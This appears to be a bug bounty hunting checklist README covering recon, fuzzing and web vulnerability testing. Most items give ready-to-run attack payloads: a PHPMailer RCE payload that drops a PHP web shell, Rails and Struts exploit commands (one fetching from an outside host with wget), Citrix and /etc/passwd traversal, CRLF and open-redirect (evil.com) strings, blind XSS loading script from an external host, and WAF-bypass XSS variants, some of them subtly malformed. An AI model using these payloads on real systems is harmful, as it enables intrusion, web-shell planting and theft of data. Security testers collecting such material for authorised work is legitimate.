# 🎯 Smart Hunting Checklist 😉

A comprehensive checklist for smart and advanced bug hunting. Includes recon, vulnerability testing, CVEs, fuzzing, logic flaws, and blind XSS.

---

## 🛰️ Reconnaissance

- [ ] `gau --threads 40 target.com`  
  📌 *Example:* Extract archived URLs for deeper testing  
- [ ] `waybackurls target.com`  
  📌 *Example:* Retrieve old endpoints from the Wayback Machine  
- [ ] Check GitHub using dorks  
  📌 *Example:* Search with dork: `password filename:.env`  
- [ ] Test for misconfigured storage buckets  
  📌 *Example:* Access `https://storage.googleapis.com/<org-name>`  
- [ ] Unauthorized access to Google Groups  
  📌 *Example:* `https://groups.google.com/a/target.com`  
- [ ] `blc http://target.com -ro`  
  📌 *Example:* Check for broken links on the target site  
- [ ] Email verification abuse  
  📌 *Example:* Try registering `admin@target.com`

---

## 🔍 Fuzzing & Enumeration

- [ ] VHost fuzzing  
  📌 *Example:* Test subdomains like `admin.target.com`, `dev.target.com`  
- [ ] Fuzz Atlassian endpoints  
  📌 *Example:* `targetname.atlassian.net`  
- [ ] Fuzz Jira installations  
  📌 *Example:* `jira.target.com`  
- [ ] Fuzz `.xhtml` files  
  📌 *Example:* `/orders.xhtml`  
- [ ] Sensitive file access via weird paths  
  📌 *Example:* `target.com/home/....4....json`  
- [ ] Key/Token discovery  
  📌 *Example:* Look for API keys in JavaScript or GitHub

---

## 🧪 Vulnerability Testing

### 🧊 Web Cache Deception

- [ ] Add `X-Forwarded-Host: target.com` in Burp > Options
      
  📌 *Example:* Search for this header in logs or cached responses

### 🔄 HTTP Methods

- [ ] Change request method to `TRACE`
      
  📌 *Example:* `TRACE / HTTP/1.1` might leak headers

### 🔁 HTTP Request Smuggling

- [ ] Test for Request Smuggling
      
  📌 *Example:* Try TE/CL desync techniques

### 🔐 CRLF Injection

- [ ] Test for CRLF Injection
      
  📌 *Example:* `%0d%0aSet-Cookie: hacked=1`

### 🔀 Open Redirect Bypass

- [ ] Bypass filters
      
  📌 *Example:* `//evil.com%2F@target.com`

### 🧠 Business Logic Bugs

- [ ] Test account deletion logic
      
  📌 *Example:* Register > Delete > Register again with same username

---

## 💥 Known Exploits & CVEs

- [ ] `CVE-2016-10033` — PHPMailer RCE
      
📌 *Example:*
```bash
email: "attacker@127.0.0.1" -oQ/tmp/ -X/var/www/shell.php root"@127.0.0.1
subject: <?php system($_GET['cmd']); ?>
```
- [ ] `CVE-2013-0156` — Ruby on Rails Object Injection
      
📌 *Example:*  
```bash
ruby rails_rce.rb http://target.com 'cp /etc/passwd public/me.txt'
```
- [ ] `CVE-2019-11043` — PHP-FPM RCE on NGINX
      
📌 *Example:* 
```bash
./phuip-fpizdam http://target.com/info.php
```
- [ ] `CVE-2019-19781` — Citrix Directory Traversal
      
📌 *Example:*
```bash
curl -vk -path-as-is https://$TARGET/vpn/../vpns/
```
- [ ] Apache Struts RCE
      
📌 *Example:*
```bash
python struts-pwn.py -u http://target.com/orders.xhtml -c "wget http://ip:1337/test"
```
---
## 🐛 Common OWASP Vulns
- [ ] Use `gf + ffuf` to find XSS, LFI, SQLi, SSRF
      
📌 *Example:*
```bash
gau target.com | gf xss,lfi,sqli,ssrf | qsreplace FUZZ | ffuf -u FUZZ -w payloads/xss.txt -fr "FUZZ"
```
- [ ] Try file traversal payloads in `Accept:` header (Django/Rails/Node)
      
📌 *Example:*
```bash
Accept: ../../../../etc/passwd
```
- [ ] Test for SQLi and Path Traversal
      
📌 *Example:*
```bash
cat urls.txt | grep "?" | qsreplace ../../../../etc/passwd | ffuf -u FUZZ -w - -mr '^root:'
```
---
## 🧬 Crypto / Encoding Issues
- [ ] Electronic Code Book (ECB) pattern
      
📌 *Example:*
```text
Look for repeating blocks like AAAAAAA aaaaaa BBBBB
```
---
## 🕵️‍♂️ Blind XSS (BXSS)
- [ ] Inject BXSS payload in User-Agent header
      
📌 *Example:*
```bash
<script src=//xss.ht></script>
```
- [ ] Use payloads in error-generating forms (login, signup, forgot password)
- [ ] Set BXSS payload as password
      
📌 *Example:*
```bash
<script src=//xss.ht></script>
```

## ⚒️ Unicode Normalization
- [ ] Don't give up if `<`, `>`, `"` or `'` are filtered! Many apps normalize Unicode after the WAF/security layer.

📌 *Some bypass variants (URL-encoded)*
```
< ➔ %EF%BC%9C
> ➔ %EF%BC%9E
" ➔ %EF%BC%A2
' ➔ %EF%BC%87
` ➔ %EF%BD%80
```
For example, inject `%EF%BC%9Cscript%EF%BC%9E` and check if it reflects as `<script>` in the DOM.

Automate these quirks with recollapse :  https://github.com/0xacb/recollapse


## 🚧 If SSRF is not works in image url parameter then try XSS

📌 *In image parameter you can use these type of payloads*
```
<svg/onload=eval(atob(‘YWxlcnQoJ1hTUycp’))>
<svg onload=eval(http://window.name)>
"><svg onload=prompt(document.domain);>.png
嘼svg><script>a<!>l<!>e<!>r<!>t<!>(<!>1<!>)</script>
```

---
## 💡 Pro Tips
- [ ] Use `-t 50` in ffuf for speed
- [ ] Use `-fc 404` to skip 404 responses
- [ ] Always test responsibly - follow the program's scope and rules!

